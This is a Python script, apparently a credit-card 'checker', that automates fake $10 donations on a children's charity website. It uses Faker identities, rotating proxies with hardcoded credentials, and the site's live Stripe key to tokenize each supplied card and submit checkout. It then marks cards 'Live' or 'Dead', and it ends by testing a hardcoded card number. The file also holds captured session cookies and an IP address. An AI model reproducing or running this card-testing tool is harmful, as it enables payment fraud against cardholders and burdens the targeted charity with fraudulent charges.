
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b

from bs4 import BeautifulSoup
import base64

import json


import time
import re
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password

def procesar_tarjeta(card: str) -> str:   
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            PROXY_HOST = "p.webshare.io:80"
            PROXY_USER = "izvhxurt-rotate"
            PROXY_PASS = "acx0bzc9xbkg"
            
            PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}"
            
            # Crear sesión global con proxy
            c = requests.Session()
            
            proxies = {
                "http": PROXY_URL,
                "https": PROXY_URL,
            }
            
            proxies.update(proxies)
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
           

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            

            headers = {
                'authority': 'www.children.org',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'ai_user=bU6KkVWZzcDjgWCpq+YKm6|2025-08-27T19:11:34.829Z; FPID=FPID2.2.Iex6uzo4D78h%2FWBd3glY2Vav0IgYggHw24uDONWUum8%3D.1756321895; PersistentSession=CfDJ8N9gCg8DXzJPhyIpqEG59G4TdmhUcuK4-43z8AHD1oxOjqYMmaoHauQcmQWZR6iCZsQwSf7xp-rnfZtkd18XvM1R8SCd7XHT_XAkqahrr2dLwCGSP7fRxehvMRgVtxmaAg; __stripe_mid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e; EPiStateMarker=true; EPiNumberOfVisits=3%2C2025-08-27T19%3A11%3A33%2C2025-09-20T02%3A22%3A32%2C2026-02-18T22%3A06%3A07; EPiStartUrlKey=https%3A%2F%2Fwww.children.org%2Fmake-a-difference%2Fdonate; lang=en-US; ARRAffinity=ab3e4dddeb0faf2f8145db1290824d1d862d2e55c1676ef83525d38f615a8348; ARRAffinitySameSite=ab3e4dddeb0faf2f8145db1290824d1d862d2e55c1676ef83525d38f615a8348; zSessionId=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; cookietimer=0; cookietimerid=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; engagementorigin=https://www.children.org/make-a-difference/donate; engagementcount=1; ai_session=fGcst2Pl0UEuQXYNTttiWg|1771452368354|1771452368354; Cookie - Page Count=1; gtm_page_view=1; _gcl_au=1.1.628020019.1771452369; _ga=GA1.1.1000413238.1771452369; _ga_430T8HQLMJ=GS2.1.s1771452368$o1$g0$t1771452368$j60$l0$h0; 5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC_mindmax=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; mindmaxipaddress=187.252.250.199; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77086; mindmaxusertype=none; mindmaxorganization=izzi; _clck=ow3p9%5E2%5Eg3o%5E0%5E2240; FPLC=uCQA5DAQvbUlAAy8zyB5jQjfXEoQlMiT22xNQ4d44pwDjiRxAMgeSXPReZ0r4llw4OnLR0lqzaTD66bl0XcgZ%2B0XAnYK6VBGEJIWDGO4%2FcP1nHyk3355biwjPswJIw%3D%3D; FPGSID=1.1771452369.1771452369.G-SFLND5SZVL.9bgp17Gldct8QTBXsrnVMQ; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; _fbp=fb.1.1771452369933.748963218493646434; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; _ga_SFLND5SZVL=GS2.1.s1771452368$o1$g1$t1771452379$j49$l0$h730861063; _uetsid=07f9bba00d1611f1809f5f7b13a2ea64|1mu1ol|2|g3o|0|2240; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|1stgkj2|1771452370301|1|1|bat.bing.com/p/conversions/c/i',
                'origin': 'https://www.children.org',
                'pragma': 'no-cache',
                'referer': 'https://www.children.org/make-a-difference/donate',
                'request-id': '|a3b51969c72d4055af8ffbec4bd33fae.80b51219d2aa4cf6',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-a3b51969c72d4055af8ffbec4bd33fae-80b51219d2aa4cf6-01',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            json_data = {
                'Amount': '10',
                'ProductOptionId': 6,
                'Description': 'Our mission',
                'BlockGuid': 'd180694e-c81a-4dee-82a9-ab0e080e0883',
            }

            response = c.post('https://www.children.org/api/cart/add', headers=headers, json=json_data)
            #responsePm = json.loads(response.text)
            #print(responsePm)

            headers = {
                'authority': 'www.children.org',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'ai_user=bU6KkVWZzcDjgWCpq+YKm6|2025-08-27T19:11:34.829Z; FPID=FPID2.2.Iex6uzo4D78h%2FWBd3glY2Vav0IgYggHw24uDONWUum8%3D.1756321895; __stripe_mid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e; EPiStateMarker=true; EPiNumberOfVisits=3%2C2025-08-27T19%3A11%3A33%2C2025-09-20T02%3A22%3A32%2C2026-02-18T22%3A06%3A07; EPiStartUrlKey=https%3A%2F%2Fwww.children.org%2Fmake-a-difference%2Fdonate; lang=en-US; ARRAffinity=ab3e4dddeb0faf2f8145db1290824d1d862d2e55c1676ef83525d38f615a8348; ARRAffinitySameSite=ab3e4dddeb0faf2f8145db1290824d1d862d2e55c1676ef83525d38f615a8348; zSessionId=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; cookietimer=0; cookietimerid=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; engagementorigin=https://www.children.org/make-a-difference/donate; _ga=GA1.1.1000413238.1771452369; 5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC_mindmax=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; mindmaxipaddress=187.252.250.199; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77086; mindmaxusertype=none; mindmaxorganization=izzi; _clck=ow3p9%5E2%5Eg3o%5E0%5E2240; FPLC=uCQA5DAQvbUlAAy8zyB5jQjfXEoQlMiT22xNQ4d44pwDjiRxAMgeSXPReZ0r4llw4OnLR0lqzaTD66bl0XcgZ%2B0XAnYK6VBGEJIWDGO4%2FcP1nHyk3355biwjPswJIw%3D%3D; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; _fbp=fb.1.1771452369933.748963218493646434; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; PersistentSession=CfDJ8J-68hv1glVBk4Kt6f_qYhKC1jewA2URwilPy_TtLQV5JjN8MCGu_R4ftMyx-cBiq4xyWy29Nvhv7zkXL2_gI0hc76xJm_yr1zGqhXIgetkdAch93HKw4YdS7zpulpsalA; gtm_page_view=2; engagementcount=2; pid=; BNES_pid=; Cookie - Page Count=2; _ga_430T8HQLMJ=GS2.1.s1771452368$o1$g1$t1771452398$j30$l0$h1566401119; __stripe_sid=fc403d20-560e-4bc5-b8c9-c5c6cd4e8aef9fd577; _uetsid=07f9bba00d1611f1809f5f7b13a2ea64|1mu1ol|2|g3o|0|2240; ai_session=fGcst2Pl0UEuQXYNTttiWg|1771452368354|1771452792277; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|1stgkj2|1771452792278|3|1|bat.bing.com/p/conversions/c/i; cookieCompliancyAccepted=here; FPGSID=1.1771452369.1771452811.G-SFLND5SZVL.9bgp17Gldct8QTBXsrnVMQ.G-430T8HQLMJ.Pg_UIOTcTquJzRT8IwXBWw; general_email_submitted=dssljwwsk@msn.com; _gcl_au=1.1.628020019.1771452369.1514719628.1771452814.1771452813; _ga_SFLND5SZVL=GS2.1.s1771452368$o1$g1$t1771452820$j50$l0$h730861063',
                'origin': 'https://www.children.org',
                'pragma': 'no-cache',
                'referer': 'https://www.children.org/checkout',
                'request-id': '|0fcaa79a510a47cc9d82ea9ce84ff852.f976209d9d374cb1',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-0fcaa79a510a47cc9d82ea9ce84ff852-f976209d9d374cb1-01',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'addressLine1': 'calle o242',
                'addressLine2': '',
                'city': 'Teabo',
                'stateId': '96',
                'postalCode': '97910',
                'countryId': '148',
            }

            response = c.post(
                'https://www.children.org/api/locations/validateAddress',
                headers=headers,
                json=json_data,
            )
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e&sid=fc403d20-560e-4bc5-b8c9-c5c6cd4e8aef9fd577&referrer=https%3A%2F%2Fwww.children.org&time_on_page=611766&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number[-2:]}&payment_user_agent=stripe.js%2F5e27053bf5%3B+stripe-js-v3%2F5e27053bf5%3B+split-card-element&pasted_fields=number&client_attribution_metadata[client_session_id]=2bc4299b-0b22-4f92-bddd-6e380f9ffac9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=79716193-f5aa-468c-9182-71dbada27ba1&key=pk_live_51HgrtnHhxqq5H7ZZwjXhFZJ6zBol49y4PFaEvjAdxnBm8lbKIjrAwoGXsJ8lYS9oa2ZzHgDpxe1vHWca6V8y8SMI00NLIdGZFr'

            response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            token = responsePm["id"]
            print(token)
            headers = {
                'authority': 'www.children.org',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                # 'cookie': 'ai_user=bU6KkVWZzcDjgWCpq+YKm6|2025-08-27T19:11:34.829Z; FPID=FPID2.2.Iex6uzo4D78h%2FWBd3glY2Vav0IgYggHw24uDONWUum8%3D.1756321895; __stripe_mid=781f2a6b-7d64-4ae7-b8da-9c1169ec5207e4c91e; EPiStateMarker=true; EPiNumberOfVisits=3%2C2025-08-27T19%3A11%3A33%2C2025-09-20T02%3A22%3A32%2C2026-02-18T22%3A06%3A07; EPiStartUrlKey=https%3A%2F%2Fwww.children.org%2Fmake-a-difference%2Fdonate; lang=en-US; ARRAffinity=ab3e4dddeb0faf2f8145db1290824d1d862d2e55c1676ef83525d38f615a8348; ARRAffinitySameSite=ab3e4dddeb0faf2f8145db1290824d1d862d2e55c1676ef83525d38f615a8348; zSessionId=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; cookietimer=0; cookietimerid=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; engagementorigin=https://www.children.org/make-a-difference/donate; _ga=GA1.1.1000413238.1771452369; 5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC_mindmax=5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC; mindmaxipaddress=187.252.250.199; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77086; mindmaxusertype=none; mindmaxorganization=izzi; _clck=ow3p9%5E2%5Eg3o%5E0%5E2240; FPLC=uCQA5DAQvbUlAAy8zyB5jQjfXEoQlMiT22xNQ4d44pwDjiRxAMgeSXPReZ0r4llw4OnLR0lqzaTD66bl0XcgZ%2B0XAnYK6VBGEJIWDGO4%2FcP1nHyk3355biwjPswJIw%3D%3D; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; _fbp=fb.1.1771452369933.748963218493646434; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; PersistentSession=CfDJ8J-68hv1glVBk4Kt6f_qYhKC1jewA2URwilPy_TtLQV5JjN8MCGu_R4ftMyx-cBiq4xyWy29Nvhv7zkXL2_gI0hc76xJm_yr1zGqhXIgetkdAch93HKw4YdS7zpulpsalA; gtm_page_view=2; engagementcount=2; pid=; BNES_pid=; Cookie - Page Count=2; __stripe_sid=fc403d20-560e-4bc5-b8c9-c5c6cd4e8aef9fd577; _uetsid=07f9bba00d1611f1809f5f7b13a2ea64|1mu1ol|2|g3o|0|2240; cookieCompliancyAccepted=here; _gcl_au=1.1.628020019.1771452369.1514719628.1771452814.1771453006; ai_session=fGcst2Pl0UEuQXYNTttiWg|1771452368354|1771453531000; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|1stgkj2|1771453531001|4|1|bat.bing.com/p/conversions/c/i; _ga_430T8HQLMJ=GS2.1.s1771452368$o1$g1$t1771453533$j60$l0$h0; _ga_SFLND5SZVL=GS2.1.s1771452368$o1$g1$t1771453533$j60$l0$h730861063; FPGSID=1.1771452369.1771453534.G-SFLND5SZVL.9bgp17Gldct8QTBXsrnVMQ.G-430T8HQLMJ.Pg_UIOTcTquJzRT8IwXBWw',
                'origin': 'https://www.children.org',
                'pragma': 'no-cache',
                'referer': 'https://www.children.org/checkout',
                'request-id': '|0fcaa79a510a47cc9d82ea9ce84ff852.6484c7926c2747d5',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'traceparent': '00-0fcaa79a510a47cc9d82ea9ce84ff852-6484c7926c2747d5-01',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'Details': {
                    'address': {
                        'countryId': '148',
                        'zipCode': '97910',
                        'stateProvinceId': '96',
                        'address1': 'calle o242',
                        'address2': '',
                        'city': 'Teabo',
                        'stateProvince': 'YU',
                    },
                    'email': email,
                    'title': 'Mr.',
                    'firstName': name,
                    'lastName': last,
                    'phone': '9971556986',
                    'cellPhone': '9971556986',
                    'allowMobile': True,
                    'acceptedGDPR': False,
                    'gdprVersion': 0,
                    'allowEmail': True,
                    'currentCountry': {
                        'countryId': 148,
                        'countryAbbr': 'MX',
                        'displayName': 'Mexico',
                        'isPostalAware': True,
                    },
                    'currentState': {
                        'stateProvinceId': 96,
                        'stateProvinceAbbr': 'YU',
                        'displayName': 'Yucatan',
                        'countryId': 148,
                    },
                    'requiresAddressValidation': False,
                    'addressConfirmed': True,
                    'validAddress': True,
                },
                'CreditCardInfo': {
                    'cardType': 'Visa',
                    'lastFour': '0684',
                    'expirationMonth': mes,
                    'expirationYear': ano_number,
                    'cardNumber': token,
                    'nameOnCard': 'jesus cahn',
                    'saveCard': True,
                    'token': token,
                },
            }

            response = c.post('https://www.children.org/api/checkout',  headers=headers, json=json_data)
            responsePm = json.loads(response.text)

        

            # verificar resultado
            if responsePm.get("hasErrors") == True:
                status = "Dead"

                # obtener mensaje del error (puede haber varios)
                error_msg = ", ".join(responsePm.get("errors", ["Unknown error"]))

                

                return {
                    "status": status,
                    "message":error_msg,
                    "cc": card
                }

            else:
                status = "Live"

                # info opcional del pago
                amount = responsePm.get("totalAmount")
                cards = responsePm.get("receiptPaymentInfo", {}).get("cardType")
                last4 = responsePm.get("receiptPaymentInfo", {}).get("paymentNumberLastFour")

                success_msg = f"Pago exitoso ✅ | {cards} ****{last4} | ${amount}"

                

                return {
                    "status": status,
                    "message":success_msg,
                    "cc": card
                }


        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}


if __name__ == "__main__":
    print(procesar_tarjeta("4772143017261310|10|2026|325"))
